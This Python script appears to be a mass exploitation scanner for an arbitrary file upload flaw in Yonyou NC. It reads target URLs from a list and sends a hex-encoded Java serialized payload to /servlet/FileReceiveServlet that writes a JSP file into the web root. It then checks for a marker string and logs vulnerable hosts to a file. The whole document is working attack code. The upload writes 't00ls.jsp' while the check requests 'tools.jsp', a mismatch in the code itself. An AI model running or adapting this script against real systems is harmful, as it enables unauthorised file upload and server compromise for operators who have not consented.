import requests

requests.packages.urllib3.disable_warnings()

data = "\xac\xed\x00\x05\x73\x72\x00\x11\x6a\x61\x76\x61\x2e\x75\x74\x69\x6c\x2e\x48\x61\x73\x68\x4d\x61\x70\x05\x07\xda\xc1\xc3\x16\x60\xd1\x03\x00\x02\x46\x00\x0a\x6c\x6f\x61\x64\x46\x61\x63\x74\x6f\x72\x49\x00\x09\x74\x68\x72\x65\x73\x68\x6f\x6c\x64\x78\x70\x3f\x40\x00\x00\x00\x00\x00\x0c\x77\x08\x00\x00\x00\x10\x00\x00\x00\x02\x74\x00\x09\x46\x49\x4c\x45\x5f\x4e\x41\x4d\x45\x74\x00\x09\x74\x30\x30\x6c\x73\x2e\x6a\x73\x70\x74\x00\x10\x54\x41\x52\x47\x45\x54\x5f\x46\x49\x4c\x45\x5f\x50\x41\x54\x48\x74\x00\x10\x2e\x2f\x77\x65\x62\x61\x70\x70\x73\x2f\x6e\x63\x5f\x77\x65\x62\x78testtest"

for url in open("用友nc.txt"):
	url = url.replace("\n", "")
	print(url+"正在检测中-----")
	url.replace("\n", "")

	headers = {
	"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0)",
	"Content-Type": "multipart/form-data;boundary=a1b37aa941c9f61c034924dbf7e8b486",
	"Referer": url
	}
	try:
		jiaoyan = requests.post(url+"/servlet/FileReceiveServlet", headers=headers, verify=False, data=data, timeout=3)
		if jiaoyan.status_code == 200:
			res = requests.get(url+"/tools.jsp", headers=headers, verify=False, timeout=2)
			if ("testtest" in res.text) and (res.status_code == 200):
				print(url+"\n======\n存在用友nc任意文件上传\n======\n")
				with open("用友nc任意文件上传 vul.txt", "a+") as f:
					f.write(url+"\n")
	except:
		continue
